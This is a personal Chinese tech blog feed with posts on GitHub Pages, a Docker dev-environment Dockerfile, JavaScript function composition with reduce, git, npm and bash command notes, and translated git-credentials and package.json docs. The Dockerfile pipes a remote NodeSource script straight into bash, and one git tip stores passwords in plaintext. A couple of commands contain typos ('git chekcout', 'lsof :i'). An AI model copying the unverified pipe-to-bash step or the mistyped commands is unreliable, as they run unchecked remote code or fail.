<li>然后的浏览器中输入这个地址就可以了。一般来说是用户名+github.io+仓库名。默认打开页面是readme文件。当然也可以输入xxx.html来显示同级目录下的不同页面。</li>
</ol>
<h2 id="其他事项"><a href="#其他事项" class="headerlink" title="其他事项"></a>其他事项</h2><ol>
<li>这玩意可以做什么？</li>
</ol>
<ul>
<li>项目代码的示例</li>
<li>个人博客，jeklly, hexo, hugo都是在基于此玩的花活。</li>
</ul>
<p>参考资料：</p>
<p>官方文档：<a href="https://help.github.com/en/articles/configuring-a-publishing-source-for-github-pages#enabling-github-pages-to-publish-your-site-from-master-or-gh-pages">官方文档</a></p>
]]></content>
  </entry>
  <entry>
    <title>使用docker构建统一的开发环境</title>
    <url>/2019/07/17/docker-for-dev-env/</url>
    <content><![CDATA[<h2 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h2><p>把要使用的软件通过dockerfile打包成一个镜像，托管到自己的registry中，这样就可以在任意别地方使用了。</p>
<a id="more"></a>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
<li><p>安装docker</p>
</li>
<li><p>使用如下的dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get  update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get upgrade -y &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get -y install git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get -y install vim &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get -y install curl &amp;&amp; \</span></span><br><span class="line"><span class="bash">    curl -sL https://deb.nodesource.com/setup_8.x | bash &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get -y install nodejs &amp;&amp; \</span></span><br><span class="line"><span class="bash">    npm install -g nrm</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> git --version &amp;&amp; bash --version &amp;&amp; ssh -V &amp;&amp; npm -v &amp;&amp; node -v</span></span><br></pre></td></tr></table></figure></li>
<li><p>运行构建命令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker build -t tbswang-dev-<span class="keyword">env</span>:<span class="number">0.0</span>.<span class="number">1</span> . <span class="comment"># t表示镜像名称，版本号 .是指当前路径中的dockerfile</span></span><br></pre></td></tr></table></figure>
<h2 id="docker中常用命令"><a href="#docker中常用命令" class="headerlink" title="docker中常用命令"></a>docker中常用命令</h2></li>
<li><p>拉取一个docker命令</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名字</span><br></pre></td></tr></table></figure></li>
<li><p>新建一个docker</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -it --name my-ubuntu -v $(<span class="built_in">pwd</span>):/root ubuntu /bin/bash <span class="comment"># v后面是挂在路径，前面是主机路径，后面是docker容器内的路径</span></span></span><br></pre></td></tr></table></figure>
<h2 id="目前存在的问题"><a href="#目前存在的问题" class="headerlink" title="目前存在的问题"></a>目前存在的问题</h2></li>
</ul>
<ol>
<li>打包出的镜像将近300m。比较大</li>
<li>run的时候执行</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li>dockerfile参考<a href="https://www.cnblogs.com/ityouknow/p/8595384.html">https://www.cnblogs.com/ityouknow/p/8595384.html</a></li>
<li>dockerfile参考 <a href="https://segmentfault.com/a/1190000007875949">https://segmentfault.com/a/1190000007875949</a></li>
<li>找不到npm的问题： <a href="https://askubuntu.com/questions/720784/how-to-install-latest-node-inside-a-docker-container">https://askubuntu.com/questions/720784/how-to-install-latest-node-inside-a-docker-container</a></li>
<li>docker build命令解析：<a href="https://zhuanlan.zhihu.com/p/38144369">https://zhuanlan.zhihu.com/p/38144369</a></li>
<li>前端环境构建： <a href="https://juejin.im/post/5b127087e51d450686184183">https://juejin.im/post/5b127087e51d450686184183</a></li>
</ol>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>compose-函数链式执行</title>
    <url>/2019/07/17/use-compose-chain-functions/</url>
    <content><![CDATA[<h2 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h2><p>使用Array.prototype.reduce，将一组函数链式执行。比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const chain &#x3D; compose(a,b,c)</span><br><span class="line">chain();</span><br></pre></td></tr></table></figure>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><a id="more"></a>
<p>我们有一组函数a,b,c，要变成依次调用，只需要a(b(c()))就可以。</p>
<p>但是，如果有多个函数，总不能光明正大的写出来调用吧。在js中可以通过将函数作为一个参数传递，毕竟回调函数。我们能不能把这一组函数变成a(b())的形式。</p>
<h3 id="reduce的执行顺序"><a href="#reduce的执行顺序" class="headerlink" title="reduce的执行顺序"></a>reduce的执行顺序</h3><p>reduce函数，原意是用在数组中，将之前的返回的结果作为下次的运行的参数。以mdn的例子(<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce#reduce()_%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce#reduce()_如何运行</a>)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].reduce(<span class="function"><span class="keyword">function</span>(<span class="params">accumulator, currentValue, currentIndex, array</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> accumulator + currentValue;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>调用顺序</p>
<table>
<thead>
<tr>
<th>callback</th>
<th>acc</th>
<th>cur value</th>
<th>cur index</th>
<th>array</th>
<th>return value</th>
</tr>
</thead>
<tbody><tr>
<td>first call</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>[0, 1, 2, 3, 4]</td>
<td>1</td>
</tr>
<tr>
<td>second call</td>
<td>1</td>
<td>2</td>
<td>2</td>
<td>[0, 1, 2, 3, 4]</td>
<td>3</td>
</tr>
<tr>
<td>third call</td>
<td>3</td>
<td>3</td>
<td>3</td>
<td>[0, 1, 2, 3, 4]</td>
<td>6</td>
</tr>
<tr>
<td>fourth call</td>
<td>6</td>
<td>4</td>
<td>4</td>
<td>[0, 1, 2, 3, 4]</td>
<td>10</td>
</tr>
</tbody></table>
<p>reduce的执行是给定一个函数，将所有的元素传入这个函数，每次函数的执行结果作为下一次的执行参数。如果没有给定初始值，第一次传入的是第一个和第二个元素。</p>
<p>假设现在有a,b,c三个函数，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// console.log(n)</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最简单的使用</p>
<pre><code>[a,b,c].reduce((a,b)=&gt;a(b()));</code></pre>
<p>是什么结果呢？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b</span><br><span class="line">a</span><br><span class="line">c </span><br><span class="line">TypeError: a is not a <span class="keyword">function</span></span><br><span class="line">    at chain.reduce (d:\workspace\learn\compose.js:12:39)</span><br><span class="line">    at Array.reduce (&lt;anonymous&gt;)</span><br><span class="line">    at Object.&lt;anonymous&gt; (d:\workspace\learn\compose.js:12:23)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:773:14)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:787:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:653:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:593:12)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:585:3)</span><br><span class="line">    at Function.Module.runMain (internal/modules/cjs/loader.js:829:12)</span><br><span class="line">    at startup (internal/bootstrap/node.js:283:19)</span><br></pre></td></tr></table></figure>
<p>这里出错了，是什么原因呢？</p>
<p>第一次循环，实际执行是a(b()),先执行b，在执行a。所以打印b, a。第二次循环，之前的返回是一个函数执行，b执行完之后的结果作为参数传入a，a执行完之后返回undefined，所以此时a就是undefined。所以实际执行就是undefined(c())。</p>
<p>可以看出是第一次没有返回值导致的错误。所以关键是在这个执行的函数中。</p>
<h3 id="函数闭包"><a href="#函数闭包" class="headerlink" title="函数闭包"></a>函数闭包</h3><p>上面的问题主要有</p>
<ol>
<li>我们不知道a是否返回，我们也不可能去修改a中的代码，所以就有调用undefined方法的情况。</li>
<li>上面的执行顺序也是不对的。</li>
</ol>
<p>解决办法其实就是在用一个函数包裹一下，作为返回值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const chain &#x3D; [a,b,c,d].reduce((a,b)&#x3D;&gt;()&#x3D;&gt;a(b()))</span><br></pre></td></tr></table></figure>
<p>测试一下，非常完美。</p>
<ol>
<li>第一次执行，输入的是a,b。然后返回一个函数，()⇒(a(b())。我们把这个匿名函数叫做acc1。</li>
<li>第二次执行，输入的是acc1,c。然后返回一个函数()⇒(acc1(c())。</li>
<li>最后这个chain就是这个样子<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> acc1(c());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>最后执行一次chain()就万事大吉。</li>
</ol>
<h3 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h3><p>既然使用闭包，就会有内存泄露的风险。</p>
<p>在reduce中，其实是将a,b,c,d这些函数不断包裹在外层包裹闭包。所以对函数要有限制。</p>
<p>一般v8中的stack的大小为1M左右。根据每个函数的占用字节，就可以算出一共多少函数。</p>
<h2 id="reduce里面发生了啥"><a href="#reduce里面发生了啥" class="headerlink" title="reduce里面发生了啥"></a>reduce里面发生了啥</h2><p>reduce是一次函数遍历。我们可以通过他的pollyfill来大致了解一下<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce#Polyfill">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce#Polyfill</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (k &lt; len) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">in</span> o) &#123;</span><br><span class="line">          value = callback(value, o[k], k, o);</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="keyword">return</span> value;</span><br></pre></td></tr></table></figure>
<p>比较关键的几行就是这里。将数组里面所有元素遍历，然后每次执行的结果记住，最后将结果返回。</p>
<h2 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2><p>前文就是理清reduce中的执行过程。那么在实际使用中还要哪些呢？</p>
<ol>
<li>参数的传递</li>
</ol>
<p>实际中每个处理的函数需要接收参数,参照一下redux中设计 <a href="https://github.com/reduxjs/redux/blob/master/src/compose.js">https://github.com/reduxjs/redux/blob/master/src/compose.js</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...funcs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (funcs.length === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">arg</span> =&gt;</span> arg;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (funcs.length === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> funcs[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> funcs.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> <span class="function">(<span class="params">...args</span>) =&gt;</span> a(b(...args)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除此之外， mdn也有类似的实现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pipe = <span class="function">(<span class="params">...functions</span>) =&gt;</span> <span class="function"><span class="params">input</span> =&gt;</span> functions.reduce(</span><br><span class="line">    (acc, fn) =&gt; fn(acc),</span><br><span class="line">    input</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>具体使用都是一样的。</p>
]]></content>
  </entry>
  <entry>
    <title>常用的git命令</title>
    <url>/2019/08/13/git-command-line-offen-used/</url>
    <content><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>记录日常开发常用的git命令</p>
<a id="more"></a>
<ul>
<li>从远程拉取分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git chekcout -b dev origin/dev</span><br></pre></td></tr></table></figure>

<ul>
<li>rebase远程最新的dev代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rebase origin/dev</span><br></pre></td></tr></table></figure>

<ul>
<li>修改上一次commit，包括文件和commit message</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit --amend <span class="comment">#之后会打开一个vim，修改信息即可</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看当前git的配置信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config user.email</span><br><span class="line">git config user.name</span><br></pre></td></tr></table></figure>

<ul>
<li>修改信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email [your email address here]</span><br></pre></td></tr></table></figure>

<ul>
<li>修改分支名字</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -m [old-name] new-name <span class="comment">#如果在当前就在旧分之，可以省略old-name</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>删除远程分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin --delete &lt;branch-name&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>设置本地分支的远程跟踪分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch --set-upstream-to=[origin/&lt;branch-name&gt;]</span><br></pre></td></tr></table></figure>

<ul>
<li>删除<code>git add</code>后暂存文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset /path/to/file</span><br></pre></td></tr></table></figure>

<ul>
<li>删除已经<code>git commit</code>之后的文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --soft HEAD~1</span><br><span class="line">git reset /path/to/file</span><br><span class="line">rm /path/to/file</span><br><span class="line">git commit</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在本地和远程分别建立代码库之后，添加远程库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin &lt;remote url&gt;</span><br><span class="line">git push -u origin master <span class="comment"># -u 表示当前将origin的master设置为本地分之的跟踪分支</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>git的密码更换</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --system --<span class="built_in">unset</span> credential.helper <span class="comment"># 清除http的用户名和密码</span></span><br><span class="line">git fetch <span class="comment"># 随便一个与远程交互命令都可以</span></span><br><span class="line">git config credential.helper store <span class="comment"># 用户名密码明文存储在～/.git-crendential文件中。http://&lt;username&gt;:&lt;password&gt;@&lt;git的url&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>删除远程地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br><span class="line"><span class="comment"># View current remotes</span></span><br><span class="line">&gt; origin  https://github.com/OWNER/REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  https://github.com/OWNER/REPOSITORY.git (push)</span><br><span class="line">&gt; destination  https://github.com/FORKER/REPOSITORY.git (fetch)</span><br><span class="line">&gt; destination  https://github.com/FORKER/REPOSITORY.git (push)</span><br><span class="line">git remote rm destination</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://segmentfault.com/a/1190000007748862">合并commit</a></p>
</li>
</ul>
<ol>
<li>挑选commit记录<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rebase -i HEAD~3</span><br><span class="line">或者</span><br><span class="line">git rebase -i [commit id] # 这个commit id不参与合并</span><br></pre></td></tr></table></figure></li>
<li>弹出vim窗口,留下的commit不用动,不想要的就加一个<em>pick改为squash或者s</em></li>
<li>保存退出.解决冲突,然后<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .  </span><br><span class="line"></span><br><span class="line">git rebase --continue  </span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li><p>批量删除分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -D `git branch | grep [要删除的分支]` </span><br></pre></td></tr></table></figure>
<p>可以用grep的语法,比如-E</p>
</li>
<li><p>删除组件缓存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rm -r --cached .</span><br></pre></td></tr></table></figure></li>
<li><p>强制添加一个文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add -f [文件名]</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>常用的npm命令</title>
    <url>/2019/08/13/npm-command-offen-used/</url>
    <content><![CDATA[<ul>
<li>查看npm全局包的位置<br>  <code>npm root -g</code></li>
</ul>
]]></content>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>git-credentials中文文档</title>
    <url>/2019/10/10/git-credentials-doc-cn/</url>
    <content><![CDATA[<ul>
<li>原文：<a href="https://git-scm.com/docs/gitcredentials">https://git-scm.com/docs/gitcredentials</a></li>
</ul>
<h2 id="名字"><a href="#名字" class="headerlink" title="名字"></a>名字</h2><p>gitcredentials - 向git提供用户名和密码</p>
<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config credential.https://example.com.username myusername</span><br><span class="line">git config credential.helper <span class="string">&quot;<span class="variable">$helper</span> <span class="variable">$options</span>&quot;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>有时候git需要一些用户信息来完成一些操作，这些用户信息叫做凭证。比如说，可能需要用户名和密码来通过http来访问远程仓库。这份手册描述了git的获取用户凭证的机制，依赖这个机制也可以避免重复输入。</p>
<h2 id="获取凭证"><a href="#获取凭证" class="headerlink" title="获取凭证"></a>获取凭证</h2><p>当没有凭证的时候，git将会按照一下的策略向用户询问用户名和密码。</p>
<ol>
<li>如果设置了<code>GIT_ASKPASS</code>环境变量，就会调用变量指定的程序。在命令行中会适时的提示，并且从标准输出设备中读取输入。</li>
<li>如果配置了<code>core.askPass</code>，就按照上面的方式使用该变量。</li>
<li>如果配置了<code>SSH_ASKPASS</code>环境变量，按照上面的方式使用该变量。</li>
<li>在终端命令行中提示用户。</li>
</ol>
<h2 id="避免重复"><a href="#避免重复" class="headerlink" title="避免重复"></a>避免重复</h2><p>对于需要一次一次的重复输入相同的用户信息的情况。git提供了两种方法来避免这种烦恼。</p>
<ol>
<li>在当前对用户权限验证环境中，对用户名进行静态配置。</li>
<li>使用凭证助手缓存或者存储密码，或者与系统密码和密码链交互。</li>
</ol>
<p>第一种很简单，适用于不能安全存储密码的情况。这会在配置文件中增加如下的配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[credential &quot;https:&#x2F;&#x2F;example.com&quot;]</span><br><span class="line">	username &#x3D; me</span><br></pre></td></tr></table></figure>
<p>另一种方式，凭证助手是一个额外的程序，git可以从中获取用户名和密码。这通常依赖系统或者其他程序提供的安全存储。</p>
<p>为了使用凭证助手，首先要选择一个使用。git当前包含了一下的凭证助手：</p>
<p><strong>cache</strong></p>
<p>在内存中缓存凭证供短期使用。查看<a href="https://git-scm.com/docs/git-credential-cache"><code>git-credential-cache</code></a>获取更多细节。</p>
<p><strong>store</strong></p>
<p>在硬盘中长期存储凭证。查看<a href="https://git-scm.com/docs/git-credential-store"><code>git-credential-store</code></a>获取更多细节。</p>
<p>有可能你已经装了第三方的助手，在<code>git help -a</code>中搜索<code>credential-*</code>，然后查阅每个助手的文档。一旦你选择了一个助手，你可以把他的名字放在<code>credential.helper</code>变量，告诉git来使用它。</p>
<ol>
<li><p>查找助手</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git help -a | grep credential-</span><br><span class="line">credential-foo</span><br></pre></td></tr></table></figure></li>
<li><p>阅读他的描述</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git help credential-foo</span><br></pre></td></tr></table></figure>
</li>
<li><p>告诉git使用他</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global credential.helper foo</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="用户鉴权的上下文环境"><a href="#用户鉴权的上下文环境" class="headerlink" title="用户鉴权的上下文环境"></a>用户鉴权的上下文环境</h2><p>git在url定义的用户权限验证上下文中使用。这个上下文用来查看与上下文相关的配置，并且传递给所有助手，可以用作安全存储的索引。</p>
<p>比如，我们访问了<code>https://example.com/foo.git</code>，当git查找配置文件确定这一部分是否匹配上下文的时候，如果上下文是配置文件更加详细的子集，他会认定两者匹配。例如，如果有这样的配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[credential &quot;https:&#x2F;&#x2F;example.com&quot;]</span><br><span class="line">	username &#x3D; foo</span><br></pre></td></tr></table></figure>

<p>然后我们可以匹配到：两个协议相同，域名相同，url模式根本不关心路径模块。然而，这个上下文不会匹配：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[credential &quot;https:&#x2F;&#x2F;kernel.org&quot;]</span><br><span class="line">	username &#x3D; foo</span><br></pre></td></tr></table></figure>

<p>因为域名不同。也不会匹配foo.example.com；git会精确比较域名，而考虑是否两个域名是相同的域。同样的，一个<a href="http://exmple.com也不会匹配,git会精确比较协议./">http://exmple.com也不会匹配，git会精确比较协议。</a></p>
<p>如果模式url不包含路径组件，那么也必须精确比较:<code>https://example.com/bar/baz.git</code>的上下文会匹配<code>https://example.com/bar/baz.git</code>,但是不会匹配<code>https://example.com/bar</code>。</p>
<h2 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h2><p>凭证上下文的选项既可以在<code>credential.\*</code>，也可以在<code>credential.&lt;url&gt;.*</code>中配置。url符合上面提到的上下文。</p>
<p>以下的选择在两种都可以使用：</p>
<p>helper</p>
<p>凭证助手的名字，或者相关的选项。如果助手名字不是绝对路径，那么会在前面注入git credential- 的字符串。这个字符串会在shell中执行。比如设置为<code>foo --option=bar</code>实际会在shell中执行<code>git credential-foo --option=bar</code>.查看制定助手的手册来查看例子。</p>
<p>如果有多个<code>credential-helper</code>的配置变量的实例，那么 <code>git</code>会按照顺序依次尝试，可能需要用户名密码，或者什么都不用。一旦<code>git</code>获取了用户名和密码，就不会尝试其他都凭证助手。</p>
<p>如果配置了<code>credential.helper</code>为空字符串，这会把凭证助手重置为空。</p>
<p>用户名<br>  如果url中没有提供，就会作为默认的用户名</p>
<p><strong>useHttpPath</strong></p>
<p>默认情况，git不会考虑使用凭证助手匹配url的path。这意味着对<code>https://example.com/foo.git</code>凭证，也可以用于<code>https://example.com/bar.git</code>。如果想要区别这些情况，就把这个选项设置为true。</p>
<h2 id="自定义凭证助手"><a href="#自定义凭证助手" class="headerlink" title="自定义凭证助手"></a>自定义凭证助手</h2><p>你也可以实现自定义的凭证助手，来配合使用凭证的系统。阅读文档获得更多细节。</p>
<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>git的一部分。</p>
]]></content>
      <tags>
        <tag>翻译</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>常用的bash命令</title>
    <url>/2020/04/29/bash-command-offen-used/</url>
    <content><![CDATA[<h2 id="查看文件夹的体积"><a href="#查看文件夹的体积" class="headerlink" title="查看文件夹的体积"></a>查看文件夹的体积</h2><pre><code>`du -h [target folder] | sort -h`</code></pre>
<h2 id="占用某个端口的程序"><a href="#占用某个端口的程序" class="headerlink" title="占用某个端口的程序"></a>占用某个端口的程序</h2><p><code>lsof :i[端口号]</code></p>
]]></content>
      <tags>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title>深入了解package.json</title>
    <url>/2020/05/21/deep-inside-package-json/</url>
    <content><![CDATA[<p>原文: <a href="https://docs.npmjs.com/files/package.json">https://docs.npmjs.com/files/package.json</a></p>
<p>描述<br>package.json文件是一个json文件,不是一个js对象字面量.</p>
<blockquote>
<p>下面是各个字段的介绍</p>
</blockquote>
<a id="more"></a>

<h2 id="name"><a href="#name" class="headerlink" title="name"></a>name</h2><p>如果想要发布包, 最重要的就是<code>name</code>和<code>version</code>字段,他们是必须的.<code>name</code>和<code>version</code>组合起来作为一个标识符, 必须是唯一的.改变包的内容需要改变包的版本号.如果不打算发布,那么名字和版本字段就是可选的.</p>
<h3 id="一些规则"><a href="#一些规则" class="headerlink" title="一些规则:"></a>一些规则:</h3><ul>
<li>名字必须少于或等于214个字符.包括了scoped package的scope. 例如@jd/xxx.</li>
<li>名字开头不能是点或者下划线</li>
<li>不能包含大写</li>
<li>名字可能会作为url的一部分,一个命令行的参数,或者以文件夹名字.所以名字不能包含非URL安全的字符.</li>
</ul>
<h3 id="一些建议"><a href="#一些建议" class="headerlink" title="一些建议:"></a>一些建议:</h3><ul>
<li>不要与node的核心模块的名字重复</li>
<li>不要加入node 或者 js. 因为写了package.json, 就已经认定是js. 另外可以使用<code>engine</code>字段指定执行的引擎</li>
<li>名字可以作为<code>require()</code>函数的参数,所以应该短一些,但要有合理的描述性</li>
<li>在用名字之前,最好先在<code>https://www.npmjs.com/</code>先检查一下</li>
</ul>
<h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><p>Version必须可以被 <a href="https://github.com/isaacs/node-semver">node-semver</a>解析.</p>
<h2 id="decription-描述"><a href="#decription-描述" class="headerlink" title="decription 描述"></a>decription 描述</h2><p>一段描述性的字符串.可以帮助人们发现你的包,可以在<code>npm search</code>中展示</p>
<h2 id="keywords-关键词"><a href="#keywords-关键词" class="headerlink" title="keywords 关键词"></a>keywords 关键词</h2><p>一个字符串列表.也可以在<code>npm search</code>中展示</p>
<h2 id="homepage-主页"><a href="#homepage-主页" class="headerlink" title="homepage 主页"></a>homepage 主页</h2><p>项目的主页.例如<code>&quot;homepage&quot;: &quot;https://github.com/owner/project#readme&quot;</code></p>
<h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><p>项目中的issue的跟踪器(比如GitHub issue, jira, gitlab issue)或者一个email 地址, 可以用来报告issue.这对遇到问题的人很有帮助.<br>他看起来是这样的:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  <span class="attr">&quot;url&quot;</span> : <span class="string">&quot;https://github.com/owner/project/issues&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;email&quot;</span> : <span class="string">&quot;project@hostname.com&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以指定一个或多个值.如果只提供一个url,那么可以把bugs的值设置为一个字符串.</p>
<p>如果设置了url,可以被<code>npm bugs</code>命令用到</p>
<h2 id="license-证书"><a href="#license-证书" class="headerlink" title="license 证书"></a>license 证书</h2><p>应该制定一个证书, 这样人们可以知道他们允许如何使用. 你可以把你的任何限制放到这里.</p>
<p>可以使用一个公开的证书比如MIT,比如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;license&quot;</span> : <span class="string">&quot;BSD-3-Clause&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
<p>如果不想给其他人使用私有的或者未发布的包,可以使用:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;UNLICENSED&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
<p>也可以设置<code>&quot;private&quot;: true</code>来避免意外发布.</p>
<h2 id="与人相关的字段-author-contributors"><a href="#与人相关的字段-author-contributors" class="headerlink" title="与人相关的字段: author, contributors"></a>与人相关的字段: author, contributors</h2><p>作者是一个人,贡献者是人名列表.其中,一个<code>person</code>是一个对象,包含<code>name</code>字段.<code>url</code>和<code>email</code>字段是非必填.比如:</p>
